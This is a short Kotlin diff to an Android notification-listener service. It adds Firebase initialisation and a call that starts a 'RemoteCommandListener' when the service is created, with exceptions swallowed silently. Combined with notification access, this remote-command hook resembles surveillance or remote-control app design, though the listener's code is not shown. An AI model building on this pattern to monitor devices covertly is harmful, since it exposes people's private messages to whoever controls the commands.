@@ -6,6 +6,7 @@ import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
 import androidx.annotation.RequiresApi
+import com.google.firebase.FirebaseApp
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
@@ -25,6 +26,16 @@ class AppNotificationListenerService : NotificationListenerService() {
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
+        }
+    }
+
+    override fun onCreate() {
+        super.onCreate()
+        try {
+            FirebaseApp.initializeApp(applicationContext)
+            RemoteCommandListener.startListening()
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
     }
 
